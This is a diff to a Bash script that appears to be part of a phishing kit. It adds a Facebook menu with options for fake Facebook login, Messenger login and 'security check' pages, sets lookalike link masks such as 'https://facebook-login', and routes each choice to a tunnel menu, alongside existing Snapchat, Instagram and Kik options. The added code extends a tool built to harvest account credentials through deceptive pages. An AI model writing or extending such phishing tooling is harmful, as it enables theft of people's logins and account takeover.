@@ -341,6 +341,34 @@ site_kik() {
 	fi
 }
 
+## Facebook
+site_facebook() {
+	cat <<- EOF
+		${RED}[${WHITE}01${RED}]${CYAN} Facebook Login Page
+		${RED}[${WHITE}02${RED}]${CYAN} Messenger Login Page
+		${RED}[${WHITE}03${RED}]${CYAN} Facebook Security Check Page
+	EOF
+
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+
+	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
+		website="fb"
+		mask='https://facebook-login'
+		tunnel_menu
+	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
+		website="fb_messenger"
+		mask='https://messenger-login'
+		tunnel_menu
+	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
+		website="fb_sec"
+		mask='https://facebook-login'
+		tunnel_menu
+	else
+		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+		{ sleep 1; clear; banner_small; site_facebook; }
+	fi
+}
+
 ## Menu
 main_menu() {
 	{ clear; banner; echo; }
@@ -350,6 +378,7 @@ main_menu() {
 		${RED}[${WHITE}01${RED}]${CYAN} Snapchat
 		${RED}[${WHITE}02${RED}]${CYAN} Instagram
 		${RED}[${WHITE}03${RED}]${CYAN} Kik
+		${RED}[${WHITE}04${RED}]${CYAN} Facebook
 		
 		${RED}[${WHITE}99${RED}]${CYAN} About
 		${RED}[${WHITE}00${RED}]${CYAN} Exit
@@ -365,6 +394,8 @@ main_menu() {
 		site_instagram
 	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
 		site_kik
+	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
+		site_facebook
 	elif [[ "$REPLY" == 99 ]]; then
 		about
 	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
